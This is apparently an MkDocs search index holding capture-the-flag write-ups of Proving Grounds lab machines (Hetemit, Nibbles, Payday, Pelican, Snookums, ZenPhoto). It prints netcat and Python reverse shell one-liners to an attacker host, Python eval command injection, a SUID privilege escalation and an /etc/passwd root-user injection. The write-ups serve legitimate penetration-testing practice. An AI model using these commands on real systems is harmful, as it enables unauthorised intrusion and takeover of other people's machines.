{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"code-examples/","title":"Code examples","text":"<p>An examples of a codeblock for Python:</p> add_numbers.py<pre><code># Function to add two numbers\ndef add_two_numbers(num1, num2):\n    return num1 + num2\n\n# Example usage\nresult = add_two_numbers(5, 3)\nprint('The sum is:', result)\n</code></pre> code-examples.md<pre><code>// Function to concatenate two strings\nfunction concatenateStrings(str1, str2) {\n  return str1 + str2;\n}\n\n// Example usage\nconst result = concatenateStrings(\"Hello, \", \"World!\");\nconsole.log(\"The concatenated string is:\", result);\n</code></pre>"},{"location":"hetemit/","title":"Hetemit","text":"<p>Hetemit is an intermediate Proving Grounds box, also rated as very hard by the community. This machine involves changing service files in order to gain privilege escalation.</p> <p><code>nmap</code> scan:</p> <pre><code>nmap &lt;target ip&gt; -sC -sV -Pn -sS -p-\n</code></pre> <p></p> <p></p> <p></p> <p>Two interesting ports stand out: <code>80</code> and <code>50000</code>. They're both <code>http</code> services, so let's check out <code>50000</code> in the browser first.</p> <p></p> <p>These seem to be either directories or paths that can be accessed. Visit <code>/verify</code>:</p> <p></p> <p>\"code\" could potentially be a placeholder for executable programs, or maybe it is code masked under a variable. We can use trial and error with <code>curl</code> and see what exactly \"code\" is:</p> <p></p> <p>\"code\" ended up being a variable. We tested <code>code=2*2</code> as a <code>POST</code> request which evaluated to <code>4</code> instead of returning an error.</p> <p>If \"code\" can evaluate simple equations, it could be the case that it can run shell commands as well. We'll try running <code>code=os.system('whoami')</code>:</p> <p></p> <p><code>0</code> was returned, but the response body did not error out. This is an example of an error:</p> <p></p> <p>For future reference, if <code>os</code> was not available we could potentially use <code>code=__import__('os').system('whoami')</code>. Double underscores around \"import\" are necessary for one liners or if we need to include python code within a single string.</p> <p>Okay, now that we know shell code doesn't give us any errors, maybe we can try setting up a connection between our attacker machine and the target machine. Have a <code>nc</code> listener on port <code>18000</code>, which is an open port from our <code>nmap</code> scan, then have this line:</p> <pre><code>code=os.system('nc &lt;attacker ip&gt; 18000 -e /bin/bash')\n</code></pre> <p></p> <p></p> <p>Great! We got a shell. We can upgrade it with:</p> <pre><code>python3 -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre> <p>Or we can have a <code>penelope</code> listener instead:</p> <p></p> <p>Check for <code>sudo</code> commands with:</p> <pre><code>sudo -l\n</code></pre> <p></p> <p>As the user <code>cmeeks</code>, it seems like we have permissions to start, stop and restart this service. Could be useful later on, we'll keep note of this.</p> <p>Transfer <code>linpeas</code> over to the target's <code>/tmp</code> folder and run it. Don't forget to <code>chmod +x</code> the file once transferred.</p> <p></p> <p></p> <p></p> <p></p> <p>These findings all point to a file called <code>pythonapp.service</code>, and we apparently have write privileges over it. Sounds sensitive and interesting, let's check it out. <code>cd</code> into <code>/etc/systemd/system</code>, then we can <code>nano</code> <code>pythonapp.service</code>:</p> <p></p> <p>This <code>.service</code> file tells Linux how to start, stop and manage a specific program or service. <code>ExecStart</code> is the first command that is run once the service starts. Since we have write privileges over this file, we can try running a reverse shell one liner while also changing the <code>User</code> to <code>root</code>:</p> <p></p> <p>Have a <code>nc</code> listener on port <code>80</code> and then reboot the service on the target since we have permissions to do so (<code>sudo -l</code>):</p> <p></p> <p>Rooted! </p>"},{"location":"nibbles/","title":"Nibbles","text":"<p>Nibbles is an intermediate Proving Grounds box, also rated as intermediate by the community. After gaining an initial foothold through <code>RCE</code>, we discover an interesting <code>SUID</code> binary with <code>find</code>, and from there we can escalate privileges.</p> <p><code>nmap</code> scan:</p> <pre><code>nmap &lt;target ip&gt; -sS -Pn -p-\n</code></pre> <p></p> <p></p> <p>Let's try using <code>gobuster</code> on port 80:</p> <pre><code>gobuster dir -u http://&lt;target ip&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre> <p></p> <p>Nothing of interest, but we do we the <code>postgresql</code> port open so let's connect to it. Before finding actual usernames or passwords we can attempt default credentials. Google <code>list of postgresql usernames and passwords</code>:</p> <p></p> <p></p> <p>Okay, now connect to <code>postgresql</code> and try using <code>postgres</code> as the password:</p> <pre><code>psql -h &lt;target ip&gt; -p 5437 -U postgres\n</code></pre> <p></p> <p>Nice! next to <code>psql</code> we can see the version of the service, <code>server 11.7</code>.</p> <p>We might be able to find an exploit through enumerating this version of postgres through <code>searchsploit</code> and <code>Google</code>:</p> <p></p> <p></p> <p>Results with <code>RCE</code> is always great news. Most likely will have an easier time gaining the initial foothold.</p> <p></p> <p>Clone the repo and follow the instructions:</p> <p></p> <p>Within the exploit, don't forget to modify the data highlighted (<code>RHOST</code> and <code>RPORT</code> refer to the target machine, <code>LHOST</code> and <code>LPORT</code> are the attacker machine):</p> <p></p> <p>Have a listener on port 80 and then run the exploit:</p> <pre><code>nc -nlvp 80\n</code></pre> <p></p> <p></p> <p>Nice, we received a shell. Can we retrieve <code>local.txt</code>?</p> <p></p> <p>Check to see if any <code>SUID</code> binaries are available:</p> <pre><code>find / -type f -perm -4000 2&gt;/dev/null\n</code></pre> <p><code>find</code> itself is a binary with an <code>SUID</code> bit, so let's look it up on <code>GTFOBins</code>:</p> <p></p> <p>By running the <code>find</code> command from its full path in this manner (Under the <code>SUID</code> section) we gain elevated privileges. First let's see where <code>find</code> is:</p> <pre><code>which find\n</code></pre> <p></p> <p>Now, execute the line from <code>gtfobins</code>:</p> <pre><code>/usr/bin/find . -exec /bin/sh -p \\; -quit\n</code></pre> <p></p> <p>Rooted! </p>"},{"location":"payday/","title":"Payday","text":"<p>Payday is an intermediate Proving Grounds box, also rated as intermediate by the community. An outdated version of the CS Cart service allows for a malicious file upload which gives us a shell. Discovering a pattern in database credentials leads us to log in as another user who has access to all <code>sudo</code> commands.</p> <p>Start with a simple <code>nmap</code> scan:</p> <pre><code>nmap &lt;target ip&gt; -sC -sS -sV -Pn -p- -T4 --min-rate 10000\n</code></pre> <p></p> <p></p> <p>Port 80 seems to be open and also the easiest to check. Let's use <code>dirsearch</code> as well:</p> <pre><code>python3 dirsearch.py -u &lt;target ip&gt;:8080 -e html,txt,php -x 400,401,403,404\n</code></pre> <p></p> <p></p> <p>Under the Autehntication tab on the right we have a login field. We'll attempt a login with default credentials like <code>admin:admin</code>:</p> <p></p> <p>Nice, it worked!</p> <p>By visiting <code>/admin</code> after logging in as <code>admin</code> we land here:</p> <p></p> <p>Looking at the header of this page and in various spots of the landing page we can surmise that a service called <code>CS Cart</code> must be in use. Let's enumerate it with <code>searchsploit</code> and <code>Google</code>:</p> <p></p> <p>This is great, we see a lot of exploits including <code>RCE</code>, <code>LFI</code> and <code>Remote File Inclusion</code> which are all good signs of a compromised service.</p> <p></p> <p></p> <p>This Github repository <code>cs cart authenticated RCE</code> seems interesting, let's check it out:</p> <p></p> <p>Following the steps of this repo we visit <code>/admin</code> again. Under <code>LOOK AND FEEL</code> in the right sidebar of the page we click <code>Template editor</code>:</p> <p></p> <p>Prepare a reverse shell script (Google <code>pentestmonkey reverse shell</code>):</p> <p></p> <p>Rename the script with a <code>.phtml</code> extension:</p> <p></p> <p>Have an <code>nc</code> listener on port 80 and then visit <code>http://&lt;target ip&gt;/skins/reverse_shell.phtml</code>:</p> <p></p> <p></p> <p>Awesome, looks like we got a shell! See if we can grab <code>local.txt</code>:</p> <p></p> <p>Despite being <code>www-data</code>, we were able to <code>cd</code> into <code>patrick</code>'s directory. We may need to login as <code>patrick</code> later on.</p> <p>Under <code>/var/www</code> we discover a potentially sensitive file <code>config.php</code>. Use <code>cat</code> to extract contents from it:</p> <p></p> <p>If database credentials have the same username and password, it might be the case that other parts of this machine follow the same pattern. It couldn't hurt to try logging in as <code>patrick</code> with the password <code>patrick</code>:</p> <pre><code>su patrick\n</code></pre> <p></p> <p>Cool, let's see if <code>patrick</code> has any available <code>sudo</code> commands:</p> <pre><code>sudo -l\n</code></pre> <p></p> <p>This means that <code>patrick</code> can use any command under <code>sudo</code>. Makes our job a lot easier, all we need to do is switch to the <code>root</code> user:</p> <pre><code>sudo su root\n</code></pre> <p></p> <p>Rooted! </p>"},{"location":"pelican/","title":"Pelican","text":"<p>Pelican is an intermediate Proving Grounds box, also rated as intermediate by the community. <code>gcore</code> and <code>strings</code> are binaries used in this lab to extract credentials from snapshots of a particular program which are then used for privilege escalation.</p> <p>We will start with a basic <code>nmap</code> scan:</p> <pre><code>nmap &lt;target ip&gt; -sC -sS -sV -Pn -p- -T4 --min-rate 10000\n</code></pre> <p></p> <p></p> <p>Ports of interest are <code>8080</code> and <code>8081</code>, but because it looks like <code>8080</code> leads to a <code>404</code> dead end, we can start with <code>8081</code>.</p> <p></p> <p>While we analyze port <code>8080</code>, we can begin a <code>dirsearch</code>:</p> <pre><code>python3 dirsearch.py -u &lt;target ip&gt;:8081 -e html,txt,php -x 400,401,403,404\n</code></pre> <p></p> <p>Nothing of interest found. From the landing page of port <code>8080</code> we can see a version number (v1.0) on the top right. Let's enumerate this number along with key words like ZooKeeper and Exhibitor, which are potential service names.</p> <pre><code>searchsploit zookeeper\n</code></pre> <p></p> <p>We get back a result with <code>searchsploit</code>, confirming that ZooKeeper is indeed a service. But the version number doesn't seem to match. Let's hit up Google:</p> <p></p> <p>Exploit DB</p> <p></p> <p>ExploitDB tells us this is an RCE vulnerability which is always good news for hackers. Looking up the CVE number on Google lands us at a Github PoC:</p> <p></p> <p></p> <p><code>git clone</code> the repo and let's execute this bad boy! </p> <pre><code>python3 CVE-2019-5029 &lt;target ip&gt; &lt;target port&gt; &lt;attacker ip&gt; &lt;attacker port&gt;\n</code></pre> <p>Have a listener up on port 80 on another with <code>nc</code> or <code>penelope</code>:</p> <p></p> <p></p> <p>We got a shell! We're logged in as the user <code>charles</code>. Let's see if we can grab the initial foothold flag:</p> <p></p> <p>With a little bit of digging, the <code>local.txt</code> flag was found. Easy wins first: what does <code>sudo -l</code> give us? In other words, what can <code>charles</code> run as <code>sudo</code>?</p> <pre><code>sudo -l\n</code></pre> <p></p> <p><code>gcore</code> is an interesting binary, but I haven't ran into it myself before. GTFOBins gives us a nice rundown on the command:</p> <p></p> <p>In other words, this is telling us that <code>gcore</code> can be used to create snapshots of programs that can potentially have sensitive information. We'll keep this in mind as we enumerate the machine further. Let's move on to transferring both <code>pspy</code> and <code>linpeas</code> files to the target box:</p> <pre><code>./pspy32s\n</code></pre> <p></p> <p>A process does seem to be running repeatedly in the background, but not really sure what it could be or how it relates to <code>gcore</code> yet. Let's try <code>linpeas</code>:</p> <pre><code>./linpeas\n</code></pre> <p></p> <p>Couldn't find anything super interesting in the <code>linpeas</code> output except for maybe potential hidden ports that we can enumerate later. Check the machines <code>crontab</code>:</p> <pre><code>cat /etc/crontab\n</code></pre> <p></p> <p>We get that same output from <code>pspy</code> here and it looks like another process is running that we didn't catch before: <code>password-store</code>. Let's use <code>ps aux</code> to analyze this program further:</p> <pre><code>ps aux | grep \"password\"\n</code></pre> <p></p> <p><code>password-store</code> is indeed running in the background and now we know the PID of the process: <code>486</code>. With the information on <code>gcore</code> from GTFOBins, it's possible that sensitive data is stored within <code>password-store</code>.</p> <pre><code>sudo /usr/bin/gcore 486\n</code></pre> <p></p> <p></p> <p>We've created a snapshot in memory of the <code>password-store</code> process under <code>core.486</code>. It's a binary which means it isn't human readable, so we use <code>strings</code> to extract anything that is:</p> <pre><code>strings core.486\n</code></pre> <p></p> <p></p> <p>Scrolling through the output we find something that seems like the <code>root</code> password.</p> <pre><code>ClogKingpinInning731\n</code></pre> <p>Doesn't hurt to try logging into <code>root</code> with it:</p> <pre><code>su - root\n</code></pre> <p></p> <p>Rooted! </p>"},{"location":"snookums/","title":"Snookums","text":"<p>Snookums is an intermediate Proving Grounds box, also rated as intermediate by the community. After gaining an initial foothold, we discover credentials within the target's database and laterally escalate. For privilege escalation, the <code>/etc/passwd</code> file is writable which allows for direct user creation, and in this case we initialize a new <code>root</code> user.</p> <p><code>nmap</code> scan:</p> <pre><code>nmap &lt;target ip&gt; -sS -sC -sV -Pn -p- -T4 --min-rate 10000\n</code></pre> <p></p> <p></p> <p>Check out port 80:</p> <p></p> <p>We have a potential service name with <code>Simple PHP Photo Gallery</code>, could be important later. Let's <code>dirsearch</code> this <code>url</code>:</p> <pre><code>python3 dirsearch.py -u &lt;target ip&gt; -e html,txt,php -x 400,401,403,404\n</code></pre> <p></p> <p>Nothing too interesting, and without credentials we cannot login. Enumerate <code>Simple PHP Photo Gallery v0.8</code>:</p> <p></p> <p>An interesting Github repo pops up with RFI that leads in RCE which is always great for hackers.</p> <p></p> <p>The version listed here is different from what's shown on port 80, but we'll try it anyway. Clone this repo and follow instructions.</p> <p>Have a <code>nc</code> listener going, preferably on a port that's also open on the target so in this case we'll choose <code>33060</code>. Then, execute the exploit like this:</p> <pre><code>python3 exploit.py http://&lt;target ip&gt; &lt;attacker ip&gt; &lt;attacker port&gt;\n</code></pre> <p></p> <p></p> <p>We get a shell and can execute basic binaries which is great! Upgrade the initial shell with this:</p> <pre><code>python -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre> <p></p> <p>A potential sensitive file is found under <code>/var/www/html</code>, <code>/db.php</code>:</p> <p></p> <pre><code>root\nMalapropDoffUtilize1337\n</code></pre> <p>From our <code>nmap</code> scan we also know that port <code>3306</code> is being used, which means that the target is running <code>mysql</code>. We can access <code>mysql</code> and try the credentials we just found:</p> <pre><code>mysql -u root -p\n</code></pre> <p></p> <p>Enumerating the database leads us to user credentials:</p> <p></p> <p>The passwords all have <code>=</code> characters appended at the end which tells us that they are likely <code>base64</code> encoded. Let's start with <code>michael</code>:</p> <pre><code>echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d\n</code></pre> <p></p> <p>We decode the string until there aren't any <code>=</code> characters at the end, and now we're left with a human readable string:</p> <pre><code>HockSydneyCertify123\n</code></pre> <p>Can we login as <code>michael</code> with this password?</p> <pre><code>su michael\n</code></pre> <p></p> <p>Nice, we can! Grab <code>local.txt</code> and let's move on to privilege escalation.</p> <p></p> <p>Transfer <code>linpeas.sh</code> to the target machine inside of <code>/tmp</code>:</p> <p></p> <p></p> <p>A writable <code>/etc/passwd</code> is huge. That file is incredibly sensitive, and having permissions as a normal user to edit it could directly lead to <code>root</code> access. Google <code>writable /etc/passwd</code>:</p> <p></p> <p></p> <p>Create a password following these instructions:</p> <pre><code>openssl passwd -1 -salt password\n</code></pre> <p></p> <p>Now we can construct a new user with this password. Also refer to the anatomy of a <code>/etc/passwd</code> entry:</p> <p></p> <p>An ID of <code>0</code> indicates the <code>root</code>, so if we combine our generated password with IDs of <code>0</code> we will have effectively created a <code>root</code> user.</p> <pre><code>newuser:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:/test:/root:/bin/bash\n</code></pre> <pre><code>echo \"newuser:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:/test:/root:/bin/bash\" &gt;&gt; /etc/passwd\n</code></pre> <pre><code>su newuser\n</code></pre> <p></p> <p>Rooted! </p>"},{"location":"zenphoto/","title":"ZenPhoto","text":"<p>ZenPhoto is an intermediate Proving Grounds box, also rated as intermediate by the community. This machine is vulnerable to RCE, and we escalate privileges through a kernel exploit. The exploit itself involves <code>C</code> compilation so we'll install <code>gcc-multilib</code> to execute it properly.</p> <p><code>nmap</code> scan:</p> <pre><code>nmap &lt;target machine&gt; -sC -sV -sS -Pn -p-\n</code></pre> <p></p> <p>Port <code>80</code> seems to be open, let's check it out:</p> <p></p> <p>Alright, maybe we can try brute forcing directories starting here with <code>dirsearch</code>:</p> <p></p> <p>Let's visit <code>/test</code>:</p> <p></p> <p>Can we find anything under Page Source?</p> <p></p> <p></p> <p>Cool, found a service we can work with: <code>zenphoto version 1.4.1.4</code>.</p> <p>It's possible that there are other paths under <code>/test</code> so we can try <code>dirsearch</code> again from there:</p> <p></p> <p>Let's try visiting <code>/zp-core</code> first:</p> <p></p> <p>We've landed at a login field. Resetting the password, trying default credentials and also <code>sqli</code> with <code>'</code> were all unsuccessful. Can enumerate <code>zenphoto version 1.4.1.4</code> on <code>Google</code>:</p> <p></p> <p></p> <p>Downloading the exploit gives us this:</p> <p></p> <p>The exploit gives us Remote Code Execution which is great. Following what's highlighted, our input should be:</p> <pre><code>php &lt;exploit file&gt;.php &lt;target ip&gt; /&lt;path&gt;/\n</code></pre> <p>In this case, we're attacking <code>/test/</code>.</p> <p></p> <p>Reverse shells from <code>bash</code> and <code>php</code> do not work here, but one from <code>python</code> does. Here's an example:</p> <pre><code>python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;attacker ip&gt;\",&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'\n</code></pre> <p>You can find reverse shell generators from revshells.</p> <p>The reason for doing this is to create a more stable shell. <code>zenphoto-shell#</code> has unpredictable behavior such as arrow keys not functioning normally or simple linux commands like <code>ls</code> and <code>cd</code> not working at all.</p> <p>Before executing the <code>python</code> one-liner, we set up a <code>nc</code> listener on port <code>443</code> on our attacker machine:</p> <pre><code>nc -nlvp 443\n</code></pre> <p></p> <p>Nice, shell got! <code>cd</code> into <code>/home</code> to retrieve <code>local.txt</code>:</p> <p></p> <p>Transfer <code>linpeas</code> to the target's <code>/tmp</code> folder and <code>chmod +x</code> the file once received.</p> <p></p> <p>Nothing really interesting found besides the version of the operating system. We can try <code>suggester</code> which can point us in the right direction. It can be found here or can be downloaded like this:</p> <pre><code>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O suggester.sh\n</code></pre> <p></p> <p>After using <code>chmod +x</code> on <code>suggester.sh</code>, we can run it:</p> <p></p> <p>Let's download <code>rds</code> using the <code>Download URL</code> provided:</p> <p></p> <p>The exploit is a <code>C</code> file which we're having trouble compiling. We can try other avenues and come back to this if needed. Let's Google the full operating system version of the target machine:</p> <p></p> <p></p> <p>Once downloaded, we need to compile the file on our attacker machine. We may need to install the cross-architecture <code>C</code> header files with the following command:</p> <pre><code>sudo apt-get install gcc-multilib -y\n</code></pre> <p>It's recommended that we compile on the target system. <code>wget</code> the exploit to the target in <code>/tmp</code>, then we compile like this:</p> <pre><code>gcc 15285.c -i 15285 -m32\n</code></pre> <p>The <code>-m32</code> is important as it allows us to compile the file into a compatible format for 32 bit systems like the target.</p> <p>We can check the architecture with:</p> <pre><code>uname -m\n</code></pre> <p></p> <p>All that's left is to <code>chmod +x</code> the file and then execute it:</p> <p></p> <p>Rooted! </p>"}]}